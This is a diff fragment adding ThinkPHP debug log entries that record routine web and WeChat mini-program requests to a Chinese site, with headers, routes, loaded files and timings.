+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'type' => '5',
+  'user_id' => '5',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002355s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->subscription[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T20:03:57+08:00 ] 106.3.132.184 GET 123.206.57.217/
+[运行时间：0.060257s] [吞吐率：16.60req/s] [内存消耗：3,545.39kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000034s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002495s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000970s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000030s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => '',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+  'host' => '123.206.57.217',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002325s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000228s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T20:04:00+08:00 ] 106.3.132.184 GET 123.206.57.217/favicon.ico
+[运行时间：0.046187s] [吞吐率：21.65req/s] [内存消耗：2,677.43kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000039s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002703s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000952s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000039s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => '',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+  'host' => '123.206.57.217',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T20:04:03+08:00 ] 106.3.132.184 GET 123.206.57.217/favicon.ico
+[运行时间：0.064228s] [吞吐率：15.57req/s] [内存消耗：2,677.53kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000036s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003649s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001412s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000062s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip;q=1.0, br;q=0.8, *;q=0.5',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+  'host' => '123.206.57.217',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
